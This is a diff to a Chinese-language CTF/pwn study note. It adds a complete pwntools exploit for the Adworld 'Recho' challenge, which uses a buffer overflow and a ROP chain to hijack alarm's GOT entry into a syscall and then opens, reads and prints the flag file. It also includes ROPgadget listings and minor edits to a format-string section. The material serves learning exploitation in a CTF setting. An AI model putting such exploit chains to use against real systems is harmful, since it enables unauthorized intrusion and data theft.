@@ -457,6 +457,122 @@ p.interactive()
 
 首先了解64位文件的传参方式——前六个参数，从左到右存放到寄存器rdi，rsi，rdx，rcx，r8，r9中，之后的参数依次放入栈中，这和32位程序一样。
 
+### 例题：攻防世界Recho
+
+劫持GOT表，将alarm got表劫持为syscall，然后调用read读取flag文件再print进行输出
+
+exp：
+
+```
+from pwn import *
+from LibcSearcher import *
+context(arch='amd64',os="linux")
+context.log_level = 'debug'
+
+#p=process("../Recho")
+p=remote("61.147.171.105",52887)
+elf=ELF("../Recho")
+
+flag_addr = 0x00601058
+
+alarm_plt = elf.plt['alarm']
+print("alarm plt:",hex(alarm_plt))
+alarm_got = elf.got['alarm']
+print("alarm got:",hex(alarm_got))
+#@Dizzzzy:~/Desktop$ ROPgadget --binary Recho --only "pop|ret"
+#Gadgets information
+#============================================================
+#0x000000000040089c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
+#0x000000000040089e : pop r13 ; pop r14 ; pop r15 ; ret
+#0x00000000004008a0 : pop r14 ; pop r15 ; ret
+#0x00000000004008a2 : pop r15 ; ret
+#0x00000000004006fc : pop rax ; ret
+#0x000000000040089b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
+#0x000000000040089f : pop rbp ; pop r14 ; pop r15 ; ret
+#0x0000000000400690 : pop rbp ; ret
+#0x00000000004008a3 : pop rdi ; ret
+#0x00000000004006fe : pop rdx ; ret
+#0x00000000004008a1 : pop rsi ; pop r15 ; ret
+#0x000000000040089d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
+#0x00000000004005b6 : ret
+
+#@Dizzzzy:~/Desktop$ ROPgadget --binary Recho --only "add|ret"
+#Gadgets information
+#============================================================
+#0x00000000004008af : add bl, dh ; ret
+#0x00000000004008ad : add byte ptr [rax], al ; add bl, dh ; ret
+#0x00000000004008ab : add byte ptr [rax], al ; add byte ptr [rax], al ; add bl, dh ; ret
+#0x00000000004008ac : add byte ptr [rax], al ; add byte ptr [rax], al ; ret
+#0x0000000000400830 : add byte ptr [rax], al ; add cl, cl ; ret
+#0x00000000004008ae : add byte ptr [rax], al ; ret
+#0x00000000004006f8 : add byte ptr [rcx], al ; ret
+#0x000000000040070d : add byte ptr [rdi], al ; ret
+
+
+pop_rdi_addr = 0x004008a3
+pop_rsi_addr = 0x004008a1 # pop rsi ; pop r15 ; ret
+pop_rax_addr = 0x004006fc
+pop_rdx_addr = 0x004006fe
+add_rdi_al_addr = 0x0040070d
+
+p.recvuntil("Welcome to Recho server!\n")
+p.sendline(str(0x200))
+
+payload1 =  "a" * (0x30+8) 
+#######change the got ADDR of ALARM to syscall
+payload1 += p64(pop_rdi_addr).decode('unicode_escape')
+payload1 += p64(alarm_got).decode('unicode_escape')#pop rdi
+payload1 += p64(pop_rax_addr).decode('unicode_escape')
+payload1 += p64(0x5).decode('unicode_escape')#pop rax
+payload1 += p64(add_rdi_al_addr).decode('unicode_escape')#add [rdi],al
+
+#########open("flag",READONLY);
+#prototype of function:int open(const char *pathname, int flags);
+#RAX:syscall name (#define __NR_open 2)
+#RDI:Addr of filename str
+#RSI:O_RDONLY
+payload1 += p64(pop_rdi_addr).decode('unicode_escape')
+payload1 += p64(flag_addr).decode('unicode_escape') #pop rdi
+payload1 += p64(pop_rsi_addr).decode('unicode_escape')
+payload1 += p64(0).decode('unicode_escape') #pop rsi
+payload1 += p64(0).decode('unicode_escape') #pop r15
+payload1 += p64(pop_rax_addr).decode('unicode_escape')
+payload1 += p64(2).decode('unicode_escape') #pop rax
+payload1 += p64(alarm_plt).decode('unicode_escape') #syscall
+
+#########read(fd,bss_addr,100);
+#RDI:fd
+#RSI:bss_addr
+#RDX:100
+bss_addr = 0x00601070
+read_plt = elf.plt['read']
+print("read plt :",hex(read_plt))
+payload1 += p64(pop_rdi_addr).decode('unicode_escape')
+payload1 += p64(3).decode('unicode_escape') #pop rdi
+payload1 += p64(pop_rsi_addr).decode('unicode_escape')
+payload1 += p64(bss_addr).decode('unicode_escape') #pop rsi
+payload1 += p64(0).decode('unicode_escape') #pop r15
+payload1 += p64(pop_rdx_addr).decode('unicode_escape')
+payload1 += p64(0x100).decode('unicode_escape') #pop rax
+payload1 += p64(read_plt).decode('unicode_escape')
+
+#########printf(buf);
+#RDI:buf
+printf_plt = elf.plt['printf']
+print("printf plt:",hex(printf_plt))
+payload1 += p64(pop_rdi_addr).decode('unicode_escape')
+payload1 += p64(bss_addr).decode('unicode_escape') #pop rdi
+payload1 += p64(printf_plt).decode('unicode_escape')
+payload1 = payload1.ljust(0x200,'\x00')
+p.sendline(payload1)
+p.shutdown('write')
+p.interactive()
+```
+
+<figure><img src=".gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+
+
 ### 格式化字符串漏洞
 
 #### 格式化字符串格式
@@ -508,8 +624,6 @@ p.interactive()
 
 emm但是要利用他干什么还不知道，继续读代码吧。接下来调用函数sub\_400CA6(a1); 注意这里的a1就是一开始main函数里打印给我们的v4\[0]，在函数sub\_400CA6(a1)里看到栈溢出那么可以注入shellcode进行ret2syscall，也就是第六个输入点也是我们要利用的
 
-![111](F:%5CPWN%5C111.png)
-
 但是到漏洞的输入点出需要\*a1 == a1\[1]，也就是v4\[0] == v4\[1]],而一开始我们在main函数里看到
 
 ```c
@@ -519,7 +633,7 @@ emm但是要利用他干什么还不知道，继续读代码吧。接下来调�
 
 那么我们知道第一个格式化漏洞应该利用来修改二者的值让其相等，并且v4\[0]和v4\[1]地址已知，那么基本的思路就都有了。
 
-接下来是完整exp，具体解法都写在注释里了
+完整exp，具体解法都写在注释里了
 
 ```python
 from pwn import *
@@ -555,7 +669,7 @@ p.sendlineafter("Wizard: I will help you! USE YOU SPELL",payload2)
 p.interactive()
 ```
 
-解题成功留影\~![pwnstring](https://f/PWN/pwnstring.png)
+
 
 #### 格式化字符漏洞泄露canary
 
